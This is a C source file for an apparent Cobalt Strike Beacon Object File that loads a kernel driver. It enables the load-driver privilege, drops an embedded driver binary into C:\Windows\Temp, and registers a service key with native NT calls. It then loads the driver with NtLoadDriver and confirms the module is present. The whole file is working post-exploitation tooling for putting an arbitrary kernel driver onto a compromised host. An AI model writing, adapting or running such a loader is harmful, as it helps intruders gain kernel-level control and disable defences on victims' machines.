#include <windows.h>
#include <winternl.h>
#include "beacon.h"
#include "driver_data.h"

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_IMAGE_ALREADY_LOADED
#define STATUS_IMAGE_ALREADY_LOADED ((NTSTATUS)0xC000010EL)
#endif
#ifndef STATUS_OBJECT_NAME_NOT_FOUND
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)
#endif
#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif
#ifndef FILE_OVERWRITE_IF
#define FILE_OVERWRITE_IF 0x00000005
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE 0x00000040
#endif

#define SE_LOAD_DRIVER_PRIVILEGE 10
#define SystemModuleInformation 11
#define MAX_DRIVER_NAME_CHARS 64
#define MAX_PATH_CHARS 260
#define MAX_REG_PATH_CHARS 512

DECLSPEC_IMPORT VOID NTDLL$RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);
DECLSPEC_IMPORT NTSTATUS NTDLL$RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
DECLSPEC_IMPORT NTSTATUS NTDLL$NtClose(HANDLE Handle);
DECLSPEC_IMPORT NTSTATUS NTDLL$NtCreateKey(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG TitleIndex, PUNICODE_STRING Class, ULONG CreateOptions, PULONG Disposition);
DECLSPEC_IMPORT NTSTATUS NTDLL$NtOpenKey(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
DECLSPEC_IMPORT NTSTATUS NTDLL$NtSetValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, ULONG TitleIndex, ULONG Type, PVOID Data, ULONG DataSize);
DECLSPEC_IMPORT NTSTATUS NTDLL$NtDeleteKey(HANDLE KeyHandle);
DECLSPEC_IMPORT NTSTATUS NTDLL$NtLoadDriver(PUNICODE_STRING DriverServiceName);
DECLSPEC_IMPORT NTSTATUS NTDLL$NtUnloadDriver(PUNICODE_STRING DriverServiceName);
DECLSPEC_IMPORT NTSTATUS NTDLL$NtDeleteFile(POBJECT_ATTRIBUTES ObjectAttributes);
DECLSPEC_IMPORT NTSTATUS NTDLL$NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
DECLSPEC_IMPORT NTSTATUS NTDLL$NtQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
DECLSPEC_IMPORT NTSTATUS NTDLL$NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
DECLSPEC_IMPORT NTSTATUS NTDLL$NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);

DECLSPEC_IMPORT NTSTATUS NTDLL$NtCreateFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

DECLSPEC_IMPORT NTSTATUS NTDLL$NtWriteFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key
);

typedef struct _RTL_PROCESS_MODULE_INFORMATION_NATIVE {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION_NATIVE, *PRTL_PROCESS_MODULE_INFORMATION_NATIVE;

typedef struct _RTL_PROCESS_MODULES_NATIVE {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION_NATIVE Modules[1];
} RTL_PROCESS_MODULES_NATIVE, *PRTL_PROCESS_MODULES_NATIVE;

static SIZE_T xstrlenA(const char* s) {
    SIZE_T n = 0;
    if (!s) {
        return 0;
    }
    while (s[n]) {
        n++;
    }
    return n;
}

static SIZE_T xstrlenW(const wchar_t* s) {
    SIZE_T n = 0;
    if (!s) {
        return 0;
    }
    while (s[n]) {
        n++;
    }
    return n;
}

static void xzero(PVOID p, SIZE_T size) {
    BYTE* b = (BYTE*)p;
    while (size--) {
        *b++ = 0;
    }
}

static int xtolower(int c) {
    if (c >= 'A' && c <= 'Z') {
        return c + 32;
    }
    return c;
}

static int xstricmpA(const char* a, const char* b) {
    while (*a && *b) {
        int ca = xtolower(*a);
        int cb = xtolower(*b);
        if (ca != cb) {
            return ca - cb;
        }
        a++;
        b++;
    }
    return xtolower(*a) - xtolower(*b);
}

static void copyAtoW(wchar_t* dst, SIZE_T dstChars, const char* src) {
    SIZE_T i = 0;
    if (!dst || dstChars == 0) {
        return;
    }
    if (!src) {
        dst[0] = 0;
        return;
    }
    while (src[i] && i + 1 < dstChars) {
        dst[i] = (wchar_t)(unsigned char)src[i];
        i++;
    }
    dst[i] = 0;
}

static void copyAtoWLen(wchar_t* dst, SIZE_T dstChars, const char* src, int srcLen) {
    SIZE_T i = 0;
    if (!dst || dstChars == 0) {
        return;
    }
    if (!src || srcLen <= 0) {
        dst[0] = 0;
        return;
    }
    while (i + 1 < dstChars && i < (SIZE_T)srcLen && src[i]) {
        dst[i] = (wchar_t)(unsigned char)src[i];
        i++;
    }
    dst[i] = 0;
}

static void copyW(wchar_t* dst, SIZE_T dstChars, const wchar_t* src) {
    SIZE_T i = 0;
    if (!dst || dstChars == 0) {
        return;
    }
    while (src && src[i] && i + 1 < dstChars) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = 0;
}

static void appendW(wchar_t* dst, SIZE_T dstChars, const wchar_t* src) {
    SIZE_T off = xstrlenW(dst);
    SIZE_T i = 0;
    while (src && src[i] && off + i + 1 < dstChars) {
        dst[off + i] = src[i];
        i++;
    }
    dst[off + i] = 0;
}

static void basenameWtoA(char* dst, SIZE_T dstChars, const wchar_t* path) {
    const wchar_t* p = path;
    const wchar_t* base = path;
    SIZE_T i = 0;

    if (!dst || dstChars == 0) {
        return;
    }

    while (p && *p) {
        if (*p == L'\\' || *p == L'/') {
            base = p + 1;
        }
        p++;
    }

    while (base && base[i] && i + 1 < dstChars) {
        dst[i] = (char)(base[i] & 0x7f);
        i++;
    }
    dst[i] = 0;
}

static void build_paths(const wchar_t* driverName, wchar_t* dosPath, wchar_t* ntPath, wchar_t* regPath) {
    copyW(dosPath, MAX_PATH_CHARS, L"C:\\Windows\\Temp\\");
    appendW(dosPath, MAX_PATH_CHARS, driverName);
    appendW(dosPath, MAX_PATH_CHARS, L".sys");

    copyW(ntPath, MAX_PATH_CHARS, L"\\??\\");
    appendW(ntPath, MAX_PATH_CHARS, dosPath);

    copyW(regPath, MAX_REG_PATH_CHARS, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    appendW(regPath, MAX_REG_PATH_CHARS, driverName);
}

static void print_status(const char* prefix, NTSTATUS status) {
    BeaconPrintf(CALLBACK_OUTPUT, "%s0x%08lx", prefix, (ULONG)status);
}

static void sleep_ms(LONG ms) {
    LARGE_INTEGER interval;
    interval.QuadPart = -(LONGLONG)ms * 10000LL;
    NTDLL$NtDelayExecution(FALSE, &interval);
}

static BOOL enable_load_driver_privilege(void) {
    BOOLEAN previous = FALSE;
    NTSTATUS status = NTDLL$RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &previous);
    if (status != STATUS_SUCCESS) {
        print_status("[-] RtlAdjustPrivilege failed: ", status);
        return FALSE;
    }
    return TRUE;
}

static BOOL write_driver_file_nt(const wchar_t* ntPath) {
    UNICODE_STRING fileName;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile = NULL;
    NTSTATUS status;

    xzero(&iosb, sizeof(iosb));
    NTDLL$RtlInitUnicodeString(&fileName, ntPath);
    InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NTDLL$NtCreateFile(
        &hFile,
        GENERIC_WRITE | SYNCHRONIZE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL,
        0
    );

    if (status != STATUS_SUCCESS) {
        print_status("[-] NtCreateFile failed: ", status);
        return FALSE;
    }

    xzero(&iosb, sizeof(iosb));
    status = NTDLL$NtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &iosb,
        (PVOID)g_DriverData,
        (ULONG)g_DriverData_size,
        NULL,
        NULL
    );

    NTDLL$NtClose(hFile);

    if (status != STATUS_SUCCESS || iosb.Information != g_DriverData_size) {
        print_status("[-] NtWriteFile failed: ", status);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote embedded driver: %lu bytes", (ULONG)iosb.Information);
    return TRUE;
}

static BOOL delete_file_nt(const wchar_t* ntPath) {
    UNICODE_STRING fileName;
    OBJECT_ATTRIBUTES oa;
    NTSTATUS status;

    NTDLL$RtlInitUnicodeString(&fileName, ntPath);
    InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NTDLL$NtDeleteFile(&oa);
    if (status == STATUS_SUCCESS || status == STATUS_OBJECT_NAME_NOT_FOUND) {
        return TRUE;
    }

    print_status("[-] NtDeleteFile failed: ", status);
    return FALSE;
}

static BOOL set_key_dword(HANDLE key, const wchar_t* name, DWORD value) {
    UNICODE_STRING valueName;
    NTSTATUS status;

    NTDLL$RtlInitUnicodeString(&valueName, name);
    status = NTDLL$NtSetValueKey(key, &valueName, 0, REG_DWORD, &value, sizeof(value));
    if (status != STATUS_SUCCESS) {
        print_status("[-] NtSetValueKey(REG_DWORD) failed: ", status);
        return FALSE;
    }
    return TRUE;
}

static BOOL set_key_string(HANDLE key, const wchar_t* name, const wchar_t* value) {
    UNICODE_STRING valueName;
    NTSTATUS status;
    ULONG cb = (ULONG)((xstrlenW(value) + 1) * sizeof(wchar_t));

    NTDLL$RtlInitUnicodeString(&valueName, name);
    status = NTDLL$NtSetValueKey(key, &valueName, 0, REG_EXPAND_SZ, (PVOID)value, cb);
    if (status != STATUS_SUCCESS) {
        print_status("[-] NtSetValueKey(REG_EXPAND_SZ) failed: ", status);
        return FALSE;
    }
    return TRUE;
}

static BOOL setup_driver_key_nt(const wchar_t* regPath, const wchar_t* imageNtPath) {
    UNICODE_STRING keyName;
    OBJECT_ATTRIBUTES oa;
    HANDLE key = NULL;
    ULONG disposition = 0;
    NTSTATUS status;
    BOOL ok;

    NTDLL$RtlInitUnicodeString(&keyName, regPath);
    InitializeObjectAttributes(&oa, &keyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NTDLL$NtCreateKey(
        &key,
        KEY_ALL_ACCESS,
        &oa,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        &disposition
    );

    if (status != STATUS_SUCCESS) {
        print_status("[-] NtCreateKey failed: ", status);
        return FALSE;
    }

    ok = set_key_dword(key, L"Type", SERVICE_KERNEL_DRIVER) &&
        set_key_dword(key, L"Start", SERVICE_DEMAND_START) &&
        set_key_dword(key, L"ErrorControl", SERVICE_ERROR_NORMAL) &&
        set_key_string(key, L"ImagePath", imageNtPath);

    NTDLL$NtClose(key);
    return ok;
}

static BOOL delete_driver_key_nt(const wchar_t* regPath) {
    UNICODE_STRING keyName;
    OBJECT_ATTRIBUTES oa;
    HANDLE key = NULL;
    NTSTATUS status;

    NTDLL$RtlInitUnicodeString(&keyName, regPath);
    InitializeObjectAttributes(&oa, &keyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NTDLL$NtOpenKey(&key, DELETE, &oa);
    if (status == STATUS_OBJECT_NAME_NOT_FOUND) {
        return TRUE;
    }
    if (status != STATUS_SUCCESS) {
        print_status("[-] NtOpenKey(DELETE) failed: ", status);
        return FALSE;
    }

    status = NTDLL$NtDeleteKey(key);
    NTDLL$NtClose(key);

    if (status != STATUS_SUCCESS) {
        print_status("[-] NtDeleteKey failed: ", status);
        return FALSE;
    }
    return TRUE;
}

static BOOL unload_driver_nt(const wchar_t* regPath) {
    UNICODE_STRING serviceName;
    NTSTATUS status;

    NTDLL$RtlInitUnicodeString(&serviceName, regPath);
    status = NTDLL$NtUnloadDriver(&serviceName);

    if (status == STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] NtUnloadDriver succeeded");
        return TRUE;
    }
    if (status == STATUS_OBJECT_NAME_NOT_FOUND) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Driver was not loaded");
        return TRUE;
    }

    print_status("[-] NtUnloadDriver failed: ", status);
    return FALSE;
}

static BOOL load_driver_nt(const wchar_t* regPath) {
    UNICODE_STRING serviceName;
    NTSTATUS status;

    NTDLL$RtlInitUnicodeString(&serviceName, regPath);
    status = NTDLL$NtLoadDriver(&serviceName);

    if (status == STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] NtLoadDriver succeeded");
        return TRUE;
    }
    if (status == STATUS_IMAGE_ALREADY_LOADED) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] STATUS_IMAGE_ALREADY_LOADED");
        return TRUE;
    }

    print_status("[-] NtLoadDriver failed: ", status);
    return FALSE;
}

static BOOL is_driver_loaded_nt(const char* driverFileName) {
    ULONG needed = 0;
    NTSTATUS status;
    PVOID buffer = NULL;
    PVOID freeBase = NULL;
    SIZE_T regionSize = 0;
    SIZE_T freeSize = 0;
    PRTL_PROCESS_MODULES_NATIVE modules;
    ULONG i;
    BOOL found = FALSE;

    status = NTDLL$NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &needed);
    if (status != STATUS_INFO_LENGTH_MISMATCH || needed == 0) {
        print_status("[-] NtQuerySystemInformation(size) failed: ", status);
        return FALSE;
    }

    regionSize = needed + 0x1000;
    status = NTDLL$NtAllocateVirtualMemory(
        (HANDLE)-1,
        &buffer,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != STATUS_SUCCESS || !buffer) {
        print_status("[-] NtAllocateVirtualMemory failed: ", status);
        return FALSE;
    }

    status = NTDLL$NtQuerySystemInformation(SystemModuleInformation, buffer, (ULONG)regionSize, &needed);
    if (status != STATUS_SUCCESS) {
        print_status("[-] NtQuerySystemInformation(modules) failed: ", status);
        freeBase = buffer;
        freeSize = 0;
        NTDLL$NtFreeVirtualMemory((HANDLE)-1, &freeBase, &freeSize, MEM_RELEASE);
        return FALSE;
    }

    modules = (PRTL_PROCESS_MODULES_NATIVE)buffer;
    for (i = 0; i < modules->NumberOfModules; i++) {
        const char* base = (const char*)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;
        if (xstricmpA(base, driverFileName) == 0) {
            BeaconPrintf(
                CALLBACK_OUTPUT,
                "[+] Loaded module confirmed: %s at 0x%p",
                base,
                modules->Modules[i].ImageBase
            );
            found = TRUE;
            break;
        }
    }

    freeBase = buffer;
    freeSize = 0;
    NTDLL$NtFreeVirtualMemory((HANDLE)-1, &freeBase, &freeSize, MEM_RELEASE);
    return found;
}

void go(char* args, int len) {
    datap parser;
    char* argName = NULL;
    int argNameLen = 0;
    wchar_t driverName[MAX_DRIVER_NAME_CHARS];
    wchar_t dosPath[MAX_PATH_CHARS];
    wchar_t ntPath[MAX_PATH_CHARS];
    wchar_t regPath[MAX_REG_PATH_CHARS];
    char driverFileA[MAX_PATH_CHARS];

    xzero(driverName, sizeof(driverName));
    xzero(dosPath, sizeof(dosPath));
    xzero(ntPath, sizeof(ntPath));
    xzero(regPath, sizeof(regPath));
    xzero(driverFileA, sizeof(driverFileA));

    BeaconDataParse(&parser, args, len);
    argName = BeaconDataExtract(&parser, &argNameLen);

    if (argName && argNameLen > 0) {
        copyAtoWLen(driverName, MAX_DRIVER_NAME_CHARS, argName, argNameLen);
    } else {
        copyW(driverName, MAX_DRIVER_NAME_CHARS, L"EmbeddedDriverService");
    }

    build_paths(driverName, dosPath, ntPath, regPath);
    basenameWtoA(driverFileA, sizeof(driverFileA), dosPath);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Native BOF driver loader");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Embedded driver size: %lu bytes", (ULONG)g_DriverData_size);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Driver basename: %s", driverFileA);

    if (!enable_load_driver_privilege()) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SeLoadDriverPrivilege is required");
        return;
    }

    if (!write_driver_file_nt(ntPath)) {
        return;
    }

    if (is_driver_loaded_nt(driverFileA)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Driver already loaded; attempting unload first");
        unload_driver_nt(regPath);
        sleep_ms(500);
    }

    unload_driver_nt(regPath);
    sleep_ms(300);
    delete_driver_key_nt(regPath);

    if (!setup_driver_key_nt(regPath, ntPath)) {
        delete_file_nt(ntPath);
        return;
    }

    if (!load_driver_nt(regPath)) {
        delete_file_nt(ntPath);
        return;
    }

    sleep_ms(500);
    if (!is_driver_loaded_nt(driverFileA)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Driver did not appear in SystemModuleInformation");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Driver load flow completed");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Driver file remains on disk until unload");
}
